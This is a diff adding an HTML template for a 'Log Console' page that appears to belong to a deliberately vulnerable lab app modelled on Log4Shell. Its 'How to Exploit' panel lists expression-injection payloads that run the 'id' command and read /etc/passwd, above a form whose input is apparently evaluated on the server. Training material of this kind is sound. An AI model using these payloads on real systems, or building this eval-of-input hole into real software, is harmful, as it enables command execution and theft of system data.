@@ -1,0 +1,27 @@
+{% extends 'base.html' %}
+{% block title %}Log Console (CVE-2021-44228 Analog){% endblock %}
+{% block content %}
+<div class="pagehead">
+  <h1>Log Console</h1>
+  <p>Station message logger · <span class="badge warn">CVE-2021-44228 (Log4Shell) analog</span></p>
+</div>
+<div class="panel">
+  <h2>How to <span>Exploit</span></h2>
+  <pre class="code">${eval:__import__('os').getcwd()}
+${lookup:__import__('subprocess').check_output(['id'])}
+${eval:open('/etc/passwd').read()[:200]}</pre>
+</div>
+<div class="panel">
+  <form method="POST">
+    <label>Log Message</label>
+    <input type="text" name="message" placeholder="${eval:7*7}" value="{{ msg }}">
+    <button class="btn" type="submit">Log Message</button>
+  </form>
+</div>
+{% if output is not none %}
+<div class="panel">
+  <h2>Rendered <span>Output</span></h2>
+  <pre class="code">{{ output }}</pre>
+</div>
+{% endif %}
+{% endblock %}
